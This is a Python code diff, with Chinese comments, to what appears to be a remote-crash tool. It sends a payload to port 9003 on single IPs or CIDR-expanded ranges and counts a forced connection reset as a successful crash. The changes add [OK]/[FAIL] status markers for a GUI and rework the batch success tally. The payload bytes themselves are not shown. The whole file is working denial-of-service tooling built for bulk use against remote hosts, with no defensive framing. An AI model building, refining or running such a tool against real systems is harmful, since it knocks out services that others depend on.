@@ -56,6 +56,11 @@ def expand_cidr(cidr: str):
         return [cidr.strip()]
 
 
+# 结果状态标记（供 GUI 判定弹窗类型）
+RESULT_OK = "[OK]"        # 崩溃已触发 / 载荷已送达
+RESULT_FAIL = "[FAIL]"    # 明确失败（拒连/超时/无法解析等）
+
+
 def crash(ip: str, port: int = DEFAULT_PORT, payload: bytes = DEFAULT_PAYLOAD,
           timeout: float = DEFAULT_TIMEOUT, retries: int = 2,
           retry_delay: float = 3.0) -> str:
@@ -83,12 +88,12 @@ def crash(ip: str, port: int = DEFAULT_PORT, payload: bytes = DEFAULT_PAYLOAD,
     ip = (ip or "").strip()
     if not ip:
         warn("远程崩溃：未提供目标 IP，已跳过")
-        return "未提供目标 IP"
+        return f"{RESULT_FAIL} 未提供目标 IP"
     try:
         port = int(port or DEFAULT_PORT)
     except (TypeError, ValueError):
         error(f"远程崩溃：端口无效: {port}")
-        return f"端口无效: {port}"
+        return f"{RESULT_FAIL} 端口无效: {port}"
 
     attempts = 1 + max(0, int(retries))
     for attempt in range(1, attempts + 1):
@@ -107,18 +112,18 @@ def crash(ip: str, port: int = DEFAULT_PORT, payload: bytes = DEFAULT_PAYLOAD,
                 time.sleep(retry_delay)
                 continue
             warn(f"{ip}:{port} 重试 {retries} 次后 9003 仍拒连，服务未拉起")
-            return f"连接 {ip}:{port} 被拒(10061) ×{attempts}，9003 未监听（服务未拉起），已放弃"
+            return f"{RESULT_FAIL} 连接 {ip}:{port} 被拒(10061) ×{attempts}，9003 未监听（服务未拉起），已放弃"
         except socket.timeout:
             el = (time.perf_counter() - t0) * 1000
             warn(f"连接 {ip}:{port} 超时（{timeout}s）（耗时 {el:.0f}ms）")
-            return f"连接 {ip}:{port} 超时，发送失败"
+            return f"{RESULT_FAIL} 连接 {ip}:{port} 超时，发送失败"
         except socket.gaierror as exc:
             error(f"无法解析主机 {ip}: {exc}")
-            return f"无法解析主机 {ip}"
+            return f"{RESULT_FAIL} 无法解析主机 {ip}"
         except OSError as exc:
             el = (time.perf_counter() - t0) * 1000
             warn(f"连接 {ip}:{port} 失败: {exc}（耗时 {el:.0f}ms）")
-            return f"连接 {ip}:{port} 失败: {exc}"
+            return f"{RESULT_FAIL} 连接 {ip}:{port} 失败: {exc}"
 
         # 连接成功：发送载荷并判定结果
         try:
@@ -128,19 +133,19 @@ def crash(ip: str, port: int = DEFAULT_PORT, payload: bytes = DEFAULT_PAYLOAD,
                 resp = sock.recv(64)
                 if resp:
                     extra = f"，收到响应 {len(resp)} 字节: {resp!r}"
-                    msg = f"崩溃指令已发送到 {ip}:{port}{extra}"
+                    msg = f"{RESULT_OK} 崩溃指令已发送到 {ip}:{port}{extra}"
                 else:
                     extra = "，连接被对方正常关闭(EOF)"
-                    msg = f"崩溃指令已发送到 {ip}:{port}{extra}"
+                    msg = f"{RESULT_OK} 崩溃指令已发送到 {ip}:{port}{extra}"
                 info(msg)
                 return msg
             except ConnectionResetError:
                 # 10054：连接建立后被强制关闭 = 服务端解析线程崩溃 → 成功
-                msg = f"{ip}:{port} ✅ 载荷已送达，对方连接被强制关闭（崩溃已触发）"
+                msg = f"{RESULT_OK} {ip}:{port} ✅ 载荷已送达，对方连接被强制关闭（崩溃已触发）"
                 info(msg)
                 return msg
             except socket.timeout:
-                msg = f"{ip}:{port} 载荷已送达，等待响应超时（可能已生效，观察 10s）"
+                msg = f"{RESULT_OK} {ip}:{port} 载荷已送达，等待响应超时（可能已生效，观察 10s）"
                 info(msg)
                 return msg
         finally:
@@ -158,7 +163,7 @@ def crash_targets(ips, port: int = DEFAULT_PORT,
         ips:  IP 列表。
 
     Returns:
-        结果摘要字符串。
+        带状态标记的结果摘要字符串（供 GUI 判定弹窗类型）。
     """
     ips = list(ips)
     debug(f"远程崩溃 批量开始 → 共 {len(ips)} 台，端口 {port}")
@@ -168,11 +173,8 @@ def crash_targets(ips, port: int = DEFAULT_PORT,
     for i, ip in enumerate(ips, 1):
         debug(f"--- 批量进度 [{i}/{len(ips)}] {ip} ---")
         r = crash(ip, port, payload)
-        # 成功标志：✅(崩溃已触发) / 已送达 / 已发送 / 发送到，且不含“失败”
-        success = ("失败" not in r) and any(
-            m in r for m in ("✅", "已送达", "已发送", "发送到")
-        )
-        if success:
+        # 成功标志：带 [OK] 前缀
+        if r.startswith(RESULT_OK):
             ok += 1
         else:
             fail += 1
@@ -181,7 +183,10 @@ def crash_targets(ips, port: int = DEFAULT_PORT,
     info(f"远程崩溃批量完成：成功 {ok} 台，失败 {fail} 台，总耗时 {el:.2f}s")
     # 只把失败项写日志，避免刷屏
     for d in details:
-        if "失败" in d or "超时" in d:
+        if RESULT_FAIL in d or "超时" in d:
             warn(d)
-    return f"批量远程崩溃：成功 {ok} 台，失败 {fail} 台"
-    return f"批量远程崩溃：成功 {ok} 台，失败 {fail} 台"
+    if ok > 0 and fail == 0:
+        return f"{RESULT_OK} 批量远程崩溃：成功 {ok} 台，失败 0 台（总耗时 {el:.1f}s）"
+    if ok == 0 and fail > 0:
+        return f"{RESULT_FAIL} 批量远程崩溃：成功 0 台，失败 {fail} 台（总耗时 {el:.1f}s）"
+    return f"{RESULT_FAIL} 批量远程崩溃：成功 {ok} 台，失败 {fail} 台（总耗时 {el:.1f}s，部分失败）"
